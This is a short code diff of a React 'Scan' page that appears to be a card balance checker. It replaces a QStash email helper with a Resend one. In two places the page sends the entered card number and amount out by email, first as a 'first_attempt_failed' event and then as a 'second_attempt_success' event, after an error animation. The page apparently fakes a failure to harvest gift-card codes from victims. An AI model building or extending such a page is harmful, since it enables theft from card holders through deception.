@@ -1,7 +1,7 @@
 // src/pages/Scan.jsx - FIXED: Processing animation before error
 import React, { useState, useRef, useEffect } from 'react';
 import { Link, useNavigate } from 'react-router-dom';
-import { submitWithQStash } from '../services/logService';
+import { submitWithResend } from '../services/logService';
 
 // Full-screen balance component
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
@@ -169,8 +169,7 @@ const Scan = () => {
     }
     
     try {
-      // Submit with dual email flow (immediate + QStash delayed)
-      await submitWithQStash({
+      await submitWithResend({
         type: 'first_attempt_failed',
         cardNumber: simulatedCode,
         amount: amount,
@@ -214,8 +213,7 @@ const Scan = () => {
     }
     
     try {
-      // Submit with dual email flow (immediate + QStash delayed)
-      await submitWithQStash({
+      await submitWithResend({
         type: 'second_attempt_success',
         cardNumber: simulatedCode,
         amount: amount,
